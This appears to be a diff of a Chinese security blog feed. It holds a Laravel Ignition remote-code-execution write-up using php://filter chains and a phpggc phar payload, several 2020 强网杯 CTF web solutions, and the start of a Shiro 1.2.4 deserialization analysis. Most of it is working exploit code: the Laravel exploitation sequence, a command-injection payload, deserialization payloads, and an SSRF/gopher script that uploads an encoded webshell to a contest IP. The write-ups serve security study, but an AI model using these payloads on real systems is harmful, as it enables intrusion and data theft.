+<p>我们可以发现<code>laravel.log</code>文件中出现了报错信息，其中有两处<code>This is the controlled part</code>字段，同时还有一处带省略号的（提前警告这是个坑）</p>
+<pre><code>[2021-05-27 13:08:30] local.ERROR: file_get_contents(This is the controlled part): failed to open stream: No such file or directory {&quot;exception&quot;:&quot;[object] (ErrorException(code: 0): file_get_contents(This is the controlled part): failed to open stream: No such file or directory at xxxxxx\\laravel\\vendor\\facade\\ignition\\src\\Solutions\\MakeViewVariableOptionalSolution.php:75)
+[stacktrace]
+#0 [internal function]: Illuminate\\Foundation\\Bootstrap\\HandleExceptions-&gt;handleError(2, &#39;file_get_conten...&#39;, &#39;xxxxxx...&#39;, 75, Array)
+#1 xxxxxx\\laravel\\vendor\\facade\\ignition\\src\\Solutions\\MakeViewVariableOptionalSolution.php(75): file_get_contents(&#39;This is control...&#39;)</code></pre><p>它的大体结构如下面所示</p>
+<pre><code>[label1] payload [label2] payload [label3]</code></pre><h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><blockquote>
+<p>官方文档：<a href="https://www.php.net/manual/zh/filters.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/filters.php</a></p>
+</blockquote>
+<p>所以我们的核心问题变成了如何向log文件写入一个合法的phar文件，这里我们需要利用到强大的<code>php://filter</code>，我们可以利用特别的编码和解码方法来对我们插入的内容进行修改</p>
+<p><strong>清空文件</strong></p>
+<p>第一个思路是我们可以用base64在解码时会自动丢弃无效字符的方法进行清空，所以按理来说只要我们多次对内容进行base64解码，那么最终就会把所有字符丢弃</p>
+<pre><code>php://filter/read=convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=../storage/logs/laravel.log</code></pre><p>但是如果文本当中出现<code>&#39;=&#39;</code>字符，<code>base64-decode</code>会抛出错误导致写入失败</p>
+<p>所以<strong>@CHARLES FOL</strong>使用到的是php内置的官方文档未提及的<code>consumed</code>过滤器，可以直接返回空</p>
+<pre><code>php://filter/read=consumed/resource=../storage/logs/laravel.log</code></pre><p>自己尝试了一下如果服务器的php支持<code>zlib</code>或者<code>bzip2</code>的话，也可以利用解压失败返回空的性质进行清空</p>
+<pre><code>php://filter/read=zlib.inflate/resource=../storage/logs/laravel.log
+php://filter/read=bzip2.decompress/resource=../storage/logs/laravel.log</code></pre><p><strong>写入payload</strong></p>
+<p>在<code>php://filter</code>中有一个很好用的转换过滤器<code>iconv.utf16le.utf-8</code>，它能够把<code>UTF-16</code>字符转化为<code>UTF-8</code>字符，样例如下：</p>
+<pre><code class="shell">echo -ne &#39;[Some prefix ]P\0A\0Y\0L\0O\0A\0D\0[midfix]P\0A\0Y\0L\0O\0A\0D\0[Some suffix ]&#39; &gt; /tmp/test.txt</code></pre>
+<pre><code class="shell">php -r &quot;echo file_get_contents(&#39;php://filter/read=convert.iconv.utf16le.utf-8/resource=/tmp/test.txt&#39;);&quot;
+# 卛浯⁥牰晥硩崠PAYLOAD浛摩楦嵸PAYLOAD卛浯⁥畳晦硩崠</code></pre>
+<p>既可以传入我们完整的payload，又可以让其他正常字符转为无效字符，之后我们直接base64-decode即可写入payload</p>
+<p>为了只留下一个payload字段，我们可以在payload的末尾添加一个byte的字符进行干扰即可，如：</p>
+<pre><code class="shell">echo -ne &#39;[Some prefix ]P\0A\0Y\0L\0O\0A\0D\0X[midfix]P\0A\0Y\0L\0O\0A\0D\0X[Some suffix ]&#39; &gt; /tmp/test.txt</code></pre>
+<pre><code class="shell">php -r &quot;echo file_get_contents(&#39;php://filter/read=convert.iconv.utf16le.utf-8/resource=/tmp/test.txt&#39;);&quot;
+# 卛浯⁥牰晥硩崠PAYLOAD存業晤硩偝䄀夀䰀伀䄀䐀堀卛浯⁥畳晦硩崠</code></pre>
+<p>相应的限制条件是：</p>
+<ol>
+<li>保证第一个payload字段前面的字符串长度是<code>2*n bytes</code>，不然无法解码出payload</li>
+<li>保证整个字符串的总体长度是<code>2*n bytes</code>，不然会抛出以下错误<code>file_get_contents(): iconv stream filter (&quot;utf16le&quot;=&gt;&quot;utf-8&quot;): invalid multibyte sequence</code></li>
+</ol>
+<p>解决方案：</p>
+<ol>
+<li>因为日志文件部分内容可控，我们可以把前面的内容刚好填充到<code>2*n bytes</code></li>
+<li>可以用同一种方法，也可以选择把payload复写两次</li>
+</ol>
+<p><strong>写入0字节</strong></p>
+<p>最后一个问题就是我们无法向日志写入<code>\0</code>字节，这时候我们又可以用到一个转换过滤器<code>convert.quoted-printable-decode</code></p>
+<blockquote>
+<p><strong>官方说明</strong></p>
+<pre><code class="c">quoted_printable_decode ( string $str ) : string</code></pre>
+<p>该函数返回 quoted-printable 解码之后的 8-bit 字符串 (参考 <a href="http://www.faqs.org/rfcs/rfc2045" target="_blank" rel="noopener">» RFC2045</a> 的6.7章节，而不是 <a href="http://www.faqs.org/rfcs/rfc2821" target="_blank" rel="noopener">» RFC2821</a> 的4.5.2章节)</p>
+<p><strong>格式</strong></p>
+<p>(General 8bit representation) Any octet, except a CR or LF that is part of a CRLF line break of the canonical (standard) form of the data being encoded, may be represented by an “=” followed by a two digit hexadecimal representation of the octet’s value.  The digits of the hexadecimal alphabet, for this purpose, are “0123456789ABCDEF”.  Uppercase letters must be used; lowercase letters are not allowed.  Thus, for example, the decimal value 12 (US-ASCII form feed) can be represented by “=0C”, and the decimal value 61 (US- ASCII EQUAL SIGN) can be represented by “=3D”.  This rule must be followed except when the following rules allow an alternative encoding.</p>
+</blockquote>
+<p>简单来说就是将格式为<code>&quot;=&lt;hex&gt;&quot;</code>的字符串转发为对应ascii的字符串，所以我们可以将空字节编码为<code>&quot;=00&quot;</code>传入</p>
+<p>所以最终我们写入payload方法为</p>
+<pre><code>php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log</code></pre><p><strong>生成payload</strong></p>
+<p>payload的生成我们可以反序列化工具<code>phpggc</code></p>
+<blockquote>
+<p><a href="https://github.com/ambionics/phpggc" target="_blank" rel="noopener">https://github.com/ambionics/phpggc</a></p>
+</blockquote>
+<pre><code class="shell">php -d &#39;phar.readonly=0&#39; ./phpggc monolog/rce1 system id --phar phar -o php://output | base64 -w0 | sed -E &#39;s/=+$//g&#39; | sed -E &#39;s/./\0=00/g&#39;</code></pre>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><pre><code class="shell"># 使用phpggc创建payload，注意这里最后添加了一个&#39;=00&#39;，用来屏蔽第二处payload回显
+php -d &#39;phar.readonly=0&#39; ./phpggc monolog/rce1 system id --phar phar -o php://output | base64 -w0 | python -c &quot;import sys;print(&#39;&#39;.join([&#39;=&#39; + hex(ord(i))[2:].zfill(2) + &#39;=00&#39; for i in sys.stdin.read()]).upper() + &#39;=00&#39;)&quot;
+# 清空log文件
+viewFile: php://filter/read=consumed/resource=../storage/logs/laravel.log
+# 传入字符使文本对齐，这里可传入任意文本
+viewFile: tyao
+# 传入payload
+viewFile: =50=00=44=00=39=00=77=00=61=00=48=00...
+# 解码payload
+viewFile: php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log
+# phar反序列化
+viewFile: phar://../storage/logs/laravel.log</code></pre>
+<h2 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h2><ol>
+<li><p>如果传入的是形如<code>P=00D=009=00w=00...</code>的payload，倒数第二部有可能会产生<code>quoted-printable-decode</code>解码错误，原因如下，有一处省略的地方出现了<code>&quot;=0.&quot;</code>字符串导致解码失败，解决方法是将首字符<code>&#39;P&#39;</code>也进行编码就可以对齐了，懒人方法就是将所有字符进行编码 : &gt;</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105281052e3a43478f71ec9e13073.png" alt="image-20210528024447449"></p>
+</li>
+<li><p>windows下复现失败了，因为是只要在base64的payload中存在<code>&#39;=&#39;</code>时，使用<code>convert.base64-decode</code>过滤器会报错返回空</p>
+</li>
+<li><p>针对第二种情况，我们将payload的命令进行填充至无<code>&#39;=&#39;</code>出现，但是phar协议反序列化时会报phar文件签名错误，大概率是因为<code>phpggc</code>只能在Linux下使用</p>
+<pre><code>failed to open stream: phar &amp;quot;xxxx\\laravel\\storage\\logs\\laravel.log&amp;quot; has a broken signature&quot;</code></pre></li>
+<li><p>如果想要在windows复现估计得重新写一个序列化，为了不麻烦自己，还是在跑去虚拟机复现成功了</p>
+</li>
+</ol>
+<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021052811469e4b69a8d859b25c0a80.png" alt="image-20210528114607301" style="zoom:67%;">
+
+<ol start="5">
+<li>失败的建议多打几次</li>
+</ol>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://zhuanlan.zhihu.com/p/351363561" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/351363561</a></p>
+<p><a href="https://anquan.baidu.com/article/1286" target="_blank" rel="noopener">https://anquan.baidu.com/article/1286</a></p>
+<p><a href="https://www.ambionics.io/blog/laravel-debug-rce" target="_blank" rel="noopener">https://www.ambionics.io/blog/laravel-debug-rce</a></p>
+]]></content>
+      <tags>
+        <tag>漏洞研究</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2020 强网杯 web</title>
+    <url>/2020/08/29/2020-%E5%BC%BA%E7%BD%91%E6%9D%AF-web/</url>
+    <content><![CDATA[<p>强网杯的质量还是很高，只做出了一道web : )</p>
+<a id="more"></a>
+
+<h2 id="web辅助"><a href="#web辅助" class="headerlink" title="web辅助"></a>web辅助</h2><blockquote>
+<p>php反序列化字符串逃逸</p>
+</blockquote>
+<pre><code class="php">// common.php
+
+&lt;?php
+class player{
+    protected $user;
+    protected $pass;
+    protected $admin;
+
+    public function __construct($user, $pass, $admin = 0){
+        $this-&gt;user = $user;
+        $this-&gt;pass = $pass;
+        $this-&gt;admin = $admin;
+    }
+
+    public function get_admin(){
+        return $this-&gt;admin;
+    }
+}
+
+class topsolo{
+    protected $name;
+
+    public function __construct($name = &#39;Riven&#39;){
+        $this-&gt;name = $name;
+    }
+
+    public function TP(){
+        if (gettype($this-&gt;name) === &quot;function&quot; or gettype($this-&gt;name) === &quot;object&quot;){
+            $name = $this-&gt;name;
+            $name();
+        }
+    }
+
+    public function __destruct(){
+        $this-&gt;TP();
+    }
+
+}
+
+class midsolo{
+    protected $name;
+
+    public function __construct($name){
+        $this-&gt;name = $name;
+    }
+
+    public function __wakeup(){
+        if ($this-&gt;name !== &#39;Yasuo&#39;){
+            $this-&gt;name = &#39;Yasuo&#39;;
+            echo &quot;No Yasuo! No Soul!\n&quot;;
+        }
+    }
+
+
+    public function __invoke(){
+        $this-&gt;Gank();
+    }
+
+    public function Gank(){
+        if (stristr($this-&gt;name, &#39;Yasuo&#39;)){
+            echo &quot;Are you orphan?\n&quot;;
+        }
+        else{
+            echo &quot;Must Be Yasuo!\n&quot;;
+        }
+    }
+}
+
+class jungle{
+    protected $name = &quot;&quot;;
+
+    public function __construct($name = &quot;Lee Sin&quot;){
+        $this-&gt;name = $name;
+    }
+
+    public function KS(){
+        system(&quot;whoami&quot;);
+    }
+
+    public function __toString(){
+        $this-&gt;KS();  
+        return &quot;&quot;;  
+    }
+
+}
+?&gt;</code></pre>
+<pre><code class="php">// index.php
+
+&lt;?php
+@error_reporting(0);
+require_once &quot;common.php&quot;;
+require_once &quot;class.php&quot;;
+
+if (isset($_GET[&#39;username&#39;]) &amp;&amp; isset($_GET[&#39;password&#39;])){
+    $username = $_GET[&#39;username&#39;];
+    $password = $_GET[&#39;password&#39;];
+    $player = new player($username, $password);
+    file_put_contents(&quot;caches/&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;]), write(serialize($player))); 
+    echo sprintf(&#39;Welcome %s, your ip is %s\n&#39;, $username, $_SERVER[&#39;REMOTE_ADDR&#39;]);
+}
+else{
+    echo &quot;Please input the username or password!\n&quot;;
+}
+
+?&gt;
+</code></pre>
+<pre><code class="php">// common.php
+
+&lt;?php
+function read($data){
+    $data = str_replace(&#39;\0*\0&#39;, chr(0).&quot;*&quot;.chr(0), $data);
+    return $data;
+}
+function write($data){
+    $data = str_replace(chr(0).&quot;*&quot;.chr(0), &#39;\0*\0&#39;, $data);
+    return $data;
+}
+
+function check($data)
+{
+    if(stristr($data, &#39;name&#39;)!==False){
+        die(&quot;Name Pass\n&quot;);
+    }
+    else{
+        return $data;
+    }
+}
+?&gt;</code></pre>
+<pre><code class="php">// play.php
+
+&lt;?php
+@error_reporting(0);
+require_once &quot;common.php&quot;;
+require_once &quot;class.php&quot;;
+
+var_dump(read(check(file_get_contents(&quot;caches/&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;])))));
+
+@$player = unserialize(read(check(file_get_contents(&quot;caches/&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;])))));
+print_r($player);
+if ($player-&gt;get_admin() === 1){
+    echo &quot;FPX Champion\n&quot;;
+}
+else{
+    echo &quot;The Shy unstoppable\n&quot;;
+}
+
+?&gt;
+</code></pre>
+<p>先找出payload</p>
+<pre><code class="php">$a = new topsolo(new midsolo(new jungle(&#39;Tyao&#39;)));
+$b = new player(&#39;Tyao&#39;,$a,1);
+echo serialize($b);
+
+O:6:&quot;player&quot;:3:{s:7:&quot;*user&quot;;s:4:&quot;Tyao&quot;;s:7:&quot;*pass&quot;;O:7:&quot;topsolo&quot;:1:{s:7:&quot;*name&quot;;O:7:&quot;midsolo&quot;:1:{s:7:&quot;*name&quot;;O:6:&quot;jungle&quot;:1:{s:7:&quot;*name&quot;;s:4:&quot;Tyao&quot;;}}}s:8:&quot;*admin&quot;;i:1;}</code></pre>
+<p>利用字节流S绕过对name的检测</p>
+<pre><code class="php">O:6:&quot;player&quot;:3:{s:7:&quot;*user&quot;;s:4:&quot;Tyao&quot;;s:7:&quot;*pass&quot;;O:7:&quot;topsolo&quot;:1:{S:7:&quot;\00*\00n\61me&quot;;O:7:&quot;midsolo&quot;:1:{S:7:&quot;\00*\00n\61me&quot;;O:6:&quot;jungle&quot;:1:{S:7:&quot;\00*\00n\61me&quot;;s:4:&quot;Tyao&quot;;}}}s:8:&quot;*admin&quot;;i:1;}</code></pre>
+<p>查看正常的序列化数据</p>
+<pre><code class="php">O:6:&quot;player&quot;:3:{s:7:&quot;*user&quot;;s:4:&quot;user&quot;;s:7:&quot;*pass&quot;;s:3:&quot;pwd&quot;;s:8:&quot;*admin&quot;;i:0;}</code></pre>
+<p>修改【pwd】的值使其和我们的payload匹配，顺便修改个长度</p>
+<pre><code class="php">O:6:&quot;player&quot;:3:{s:7:&quot;*user&quot;;s:4:&quot;user&quot;;s:7:&quot;*pass&quot;;s:154:&quot;
+
+;s:7:&quot;*pass&quot;;O:7:&quot;topsolo&quot;:1:{S:7:&quot;\00*\00n\61me&quot;;O:7:&quot;midsolo&quot;:1:{S:7:&quot;\00*\00n\61me&quot;;O:6:&quot;jungle&quot;:1:{S:7:&quot;\00*\00n\61me&quot;;s:4:&quot;Tyao&quot;;}}}s:8:&quot;*admin&quot;;i:1;}
+
+&quot;;s:8:&quot;\0*\0admin&quot;;i:0;}</code></pre>
+<p>计算多出来的数据的长度</p>
+<pre><code class="python">len(&#39;&quot;;s:7:&quot;*pass&quot;;s:158:&#39;) == 22</code></pre>
+<blockquote>
+<p>%00*%00pass还有两个隐藏字符，下面的payload也不要忘记加上</p>
+</blockquote>
+<p>每次字符串逃逸可以多出2个字符，所以修改username为11个<code>\0*\0</code></p>
+<p>最终exp如下：</p>
+<pre><code class="php">username=\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0
+password=;s:7:&quot;%00*%00pass&quot;;O:7:&quot;topsolo&quot;:1:{S:7:&quot;\00*\00n\61me&quot;;O:7:&quot;midsolo&quot;:2:{S:7:&quot;\00*\00n\61me&quot;;O:6:&quot;jungle&quot;:1:{S:7:&quot;\00*\00n\61me&quot;;s:0:&quot;&quot;;}}};s:8:&quot;*admin&quot;;i:1;}</code></pre>
+<h2 id="Funhash"><a href="#Funhash" class="headerlink" title="Funhash"></a>Funhash</h2><blockquote>
+<p>哈希tricks</p>
+</blockquote>
+<pre><code class="php">&lt;?php
+include &#39;conn.php&#39;;
+highlight_file(&quot;index.php&quot;);
+//level 1
+if ($_GET[&quot;hash1&quot;] != hash(&quot;md4&quot;, $_GET[&quot;hash1&quot;]))
+{
+    die(&#39;level 1 failed&#39;);
+}
+
+//level 2
+if($_GET[&#39;hash2&#39;] === $_GET[&#39;hash3&#39;] || md5($_GET[&#39;hash2&#39;]) !== md5($_GET[&#39;hash3&#39;]))
+{
+    die(&#39;level 2 failed&#39;);
+}
+
+//level 3
+$query = &quot;SELECT * FROM flag WHERE password = &#39;&quot; . md5($_GET[&quot;hash4&quot;],true) . &quot;&#39;&quot;;
+$result = $mysqli-&gt;query($query);
+$row = $result-&gt;fetch_assoc(); 
+var_dump($row);
+$result-&gt;free();
+$mysqli-&gt;close();
+
+?&gt;</code></pre>
+<p>hash4强哈希碰撞，后面是凑出or 1，直接百度就行</p>
+<pre><code class="php">&lt;?php
+$int=1;
+$md4=&quot;&quot;;
+$name=&quot;0e&quot;;
+while ($md4!=$name){
+    $name=&#39;0e&#39;.$int;
+    $int++;
+    $md4=hash(&#39;md4&#39;,$name);
+}
+echo $name;</code></pre>
+<p>数组绕过hash比较，</p>
+<p>最终exp</p>
+<pre><code class="haskell">?hash1=0e251288019&amp;hash2[]=1&amp;hash3[]=2&amp;hash4=ffifdyop</code></pre>
+<h2 id="主动"><a href="#主动" class="headerlink" title="主动"></a>主动</h2><blockquote>
+<p>命令执行</p>
+</blockquote>
+<pre><code class="php">&lt;?php
+highlight_file(&quot;index.php&quot;);
+
+if(preg_match(&quot;/flag/i&quot;, $_GET[&quot;ip&quot;]))
+{
+    die(&quot;no flag&quot;);
+}
+
+system(&quot;ping -c 3 $_GET[ip]&quot;);
+
+?&gt; </code></pre>
+<p>简单命令拼接</p>
+<pre><code>ip=|cat%20*;</code></pre><h2 id="half-infiltration"><a href="#half-infiltration" class="headerlink" title="half_infiltration"></a>half_infiltration</h2><blockquote>
+<p>php反序列化 ssrf+gopher</p>
+</blockquote>
+<pre><code class="php">&lt;?php
+highlight_file(__FILE__);
+$flag = file_get_contents(&#39;ssrf.php&#39;);
+class Pass
+{
+
+    function read()
+    {
+        ob_start();
+        global $result;
+        print $result;
+    }
+}
+class User
+{
+    public $age, $sex, $num;
+    function __destruct()
+    {
+        $student = $this-&gt;age;
+        $boy = $this-&gt;sex;
+        $a = $this-&gt;num;
+        $student-&gt;$boy();
+        if (!(is_string($a)) || !(is_string($boy)) || !(is_object($student))) {
+            ob_end_clean();
+            exit();
+        }
+        global $$a;
+        $result = $GLOBALS[&#39;flag&#39;];
+        ob_end_clean();
+    }
+}
+if (isset($_GET[&#39;x&#39;])) {
+    unserialize($_GET[&#39;x&#39;])-&gt;get_it();
+}</code></pre>
+<p>参考第五空间的《do you know》，把原来的payload改一改变量名即可</p>
+<blockquote>
+<p>考点：</p>
+<ol>
+<li>反序列化一个数组使其能够输出flag</li>
+<li>$$变量覆盖</li>
+<li>throw exception异常提前中断跳出ob_end_clean()</li>
+<li>global处触发exception，因为global $this是非法的</li>
+</ol>
+</blockquote>
+<pre><code class="php">&lt;?php
+class Pass
+{
+
+}
+
+class User
+{
+    public $age,$sex,$num;
+}
+
+$a = new User();
+$a-&gt;age = new Pass();
+$a-&gt;sex = &#39;read&#39;;
+$a-&gt;num = &#39;result&#39;;
+
+$b = new User();
+$b-&gt;age = new Pass();
+$b-&gt;sex = &#39;read&#39;;
+$b-&gt;num = &#39;this&#39;;
+
+$c = &quot;Tyao&quot;;
+$x = array($a, $b, $c);
+echo(serialize($x));
+
+/* 
+output:
+a:3:{i:0;O:4:%22User%22:3:{s:3:%22age%22;O:4:%22Pass%22:0:{}s:3:%22sex%22;s:4:%22read%22;s:3:%22num%22;s:6:%22result%22;}i:1;O:4:%22User%22:3:{s:3:%22age%22;O:4:%22Pass%22:0:{}s:3:%22sex%22;s:4:%22read%22;s:3:%22num%22;s:4:%22this%22;}i:2;s:4:%22Tyao%22;}
+*/</code></pre>
+<p>转到内网渗透，给到一个ssrf接口，端口在40000，点进去只有一个文件上传，没有禁gopher协议，盲猜是gopher+ssrf</p>
+<pre><code class="php">&lt;?php 
+//经过扫描确认35000以下端口以及50000以上端口不存在任何内网服务,请继续渗透内网
+    $url = $_GET[&#39;we_have_done_ssrf_here_could_you_help_to_continue_it&#39;] ?? false; 
+        if(preg_match(&quot;/flag|var|apache|conf|proc|log/i&quot; ,$url)){
+                die(&quot;&quot;);
+        }
+
+        if($url)
+    { 
+
+            $ch = curl_init(); 
+            curl_setopt($ch, CURLOPT_URL, $url); 
+            curl_setopt($ch, CURLOPT_HEADER, 1);
+            curl_exec($ch);
+            curl_close($ch); 
+
+     } 
+
+?&gt;</code></pre>
+<p>这里很多坑，文件名不能含有<code>write</code>，一度以为<code>filter</code>写不了文件，后来才发现<code>write</code>是可以省略的 : ）</p>
+<p>文件内容不能含有<code>&lt;?</code>、<code>php</code>、<code>&lt;script</code>等等标签，需要<strong>同时</strong>用<code>rot13</code>和<code>base64</code>绕过（也不太懂什么base64之后也可以检测到<code>php</code>字段</p>
+<pre><code class="python">base64_encode(rot13(&#39;&lt;?php echo system(&quot;cat /flag&quot;);//&#39;)) = &quot;PD9jdWMgcnB1YiBmbGZncnooInBuZyAvc3ludCIpOy8v&quot;</code></pre>
+<p>给出最终exp</p>
+<pre><code class="python">import requests as rq
+import re
+
+ssid = &quot;ttt&quot;
+post_string = &quot;file=php://filter/convert.base64-decode|string.rot13/resource=1.php&amp;content=PD9jdWMgcnB1YiBmbGZncnooInBuZyAvc3ludCIpOy8v&quot;
+length = len(post_string)
+
+paramsGet = {&quot;we_have_done_ssrf_here_could_you_help_to_continue_it&quot;:&quot;gopher://127.0.0.1:40000/_POST /index.php HTTP/1.1%%0d%%0a\
+Host:127.0.0.1:40000%%0d%%0aCookie:PHPSESSID=%s;%%0d%%0aConnection:close%%0d%%0aContent-Type:application/x-www-form-urlencoded%%0d%%0aContent-Length: %d%%0d%%0a%%0d%%0a\
+%s&quot; % (ssid, length, post_string)}
+res = rq.get(&quot;http://39.98.131.124/ssrf.php&quot;, params=paramsGet)
+# print(res.text)
+
+res2 = rq.get(&quot;http://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=127.0.0.1:40000/uploads/ttt/&quot;)
+files = re.findall(&#39;&lt;a href=&quot;.*?&quot;&gt;(.*?)&lt;/a&gt;&#39;, res2.text)[5:]
+print(&quot;=========FILES============&quot;)
+print(&quot;\n&quot;.join(files))
+print(&quot;==========================&quot;)
+
+res3 = rq.get(&quot;http://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=127.0.0.1:40000/uploads/ttt/1.php&quot;)
+print(res3.text)</code></pre>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Linux提权小知识</title>
     <url>/2020/05/27/Linux%E6%8F%90%E6%9D%83%E5%B0%8F%E7%9F%A5%E8%AF%86/</url>
     <content><![CDATA[<p>稍微总结了一下关于 Linux 提权的小知识</p>
@@ -2888,198 +2855,6 @@ echo &quot;DATA&quot; &gt; $TF
 ]]></content>
       <tags>
         <tag>PRACTICE</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Shiro 1.2.4 反序列化链分析</title>
-    <url>/2020/08/01/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/</url>
-    <content><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre><code>git clone https://github.com/apache/shiro.git  
-cd shiro
-git checkout shiro-root-1.2.4  </code></pre><a id="more"></a>
-
-<p>编辑<code>pom.xml</code>，添加如下jar包</p>
-<pre><code class="xml">&lt;!--  需要设置编译的版本 --&gt;  
-    &lt;properties&gt;
-       &lt;maven.compiler.source&gt;1.6&lt;/maven.compiler.source&gt;
-       &lt;maven.compiler.target&gt;1.6&lt;/maven.compiler.target&gt;
-   &lt;/properties&gt;
-...
-   &lt;dependencies&gt;
-       &lt;dependency&gt;
-           &lt;groupId&gt;javax.servlet&lt;/groupId&gt;
-           &lt;artifactId&gt;jstl&lt;/artifactId&gt;
-           &lt;!--  这里需要将jstl设置为1.2 --&gt;
-           &lt;version&gt;1.2&lt;/version&gt; 
-           &lt;scope&gt;runtime&lt;/scope&gt;
-       &lt;/dependency&gt;
-.....
-       &lt;dependency&gt;
-           &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;
-           &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;
-           &lt;version&gt;4.0&lt;/version&gt;
-       &lt;/dependency&gt;
-&lt;dependencies&gt;  </code></pre>
-<p>创建<code>~/.m2/toolchains.xml</code>文件，添加jdk1.6环境</p>
-<pre><code class="xml">&lt;toolchains&gt;
-    &lt;toolchain&gt;
-      &lt;type&gt;jdk&lt;/type&gt;
-      &lt;provides&gt;
-        &lt;version&gt;1.6&lt;/version&gt;
-        &lt;vendor&gt;sun&lt;/vendor&gt;
-      &lt;/provides&gt;
-      &lt;configuration&gt;
-        &lt;jdkHome&gt;D:\Java\jdk1.6.0_45&lt;/jdkHome&gt;
-      &lt;/configuration&gt;
-    &lt;/toolchain&gt;
-&lt;/toolchains&gt;</code></pre>
-<p>编译成war包</p>
-<pre><code>cd shiro/samples/web  
-mvn package -D maven.skip.test=true</code></pre><p>把生成的<code>samples-web-1.2.4.war</code>放到Tomcat的webapps目录下，为了方便重命名为<code>shiro.war</code></p>
-<p>启动tomcat，访问<code>http://127.0.0.1:8080/shiro/</code>，搭建完成</p>
-<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223304.png" alt="image-20200728102626680"></p>
-<h2 id="漏洞链分析"><a href="#漏洞链分析" class="headerlink" title="漏洞链分析"></a>漏洞链分析</h2><h3 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h3><p>因为漏洞出现在<code>Remember Me</code>，所以我们记得勾选，然后再进行登录</p>
-<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223410.png" alt="image-20200731112027369"></p>
-<p>在 <code>org.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLogin</code> 处下个断点，传入的三个参数都包含了我们登陆的信息</p>
-<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223420.png" alt="image-20200731112430152"></p>
-<p>跟进<code>forgetIdentity</code>方法，它会对<code>subject</code>变量进行处理</p>
-<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223426.png" alt="image-20200731112640520"></p>
-<p>继续跟进<code>forgetIdentity</code>方法，我们会发现它主要是对<code>set-cookie</code>的一些处理</p>
-<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223444.png" alt="image-20200731112808224"></p>
-<p>继续跟进下一步，首先会判断我们有无设置<code>Remember Me</code>，如果有的话就会进入<code>rememberIdentity</code>函数</p>
-<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223449.png" alt="image-20200731113121803"></p>
-<p>继续跟进，也是对用户的登录信息进行处理</p>
-<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223456.png" alt="image-20200731113634580"></p>
-<p>我们可以看到他们把用户信息序列化之后，会进行加密</p>
-<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223502.png" alt="image-20200731113733542"></p>
-<p>这里是加密函数，这一步是获取加密所采取的方法</p>
-<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223506.png" alt="image-20200731113853889"></p>
-<p>观察本地变量，我们可以看到它加密的方法用的是AES的CBC方式</p>
-<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223544.png" alt="image-20200731114018051"></p>
-<p>数据加密主要发生在这一步</p>
-<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223745.png" alt="image-20200731141144566"></p>
-<p><code>getEncryptionCipherKey</code>函数是获得加密所需要的<code>Key</code>，因为传入的是空参数，所以采用的是默认的<code>Key</code>，这个是可以直接在源码找到的</p>
-<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223745.png" alt="image-20200731142820956"></p>
-<p>然后会将序列化好的数据进行AES加密</p>
-<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223822.png" alt="image-20200731141442083"></p>
-<p>加密完之后就会返回加密的结果</p>
-<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223809.png" alt="image-20200731114416038"></p>
-<p>后面会对返回后的加密值进行进一步处理</p>
-<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223802.png" alt="image-20200731114450542"></p>
-<p>是对序列化后的值进行<code>Base64</code>加密后存放在<code>Cookie</code>中</p>
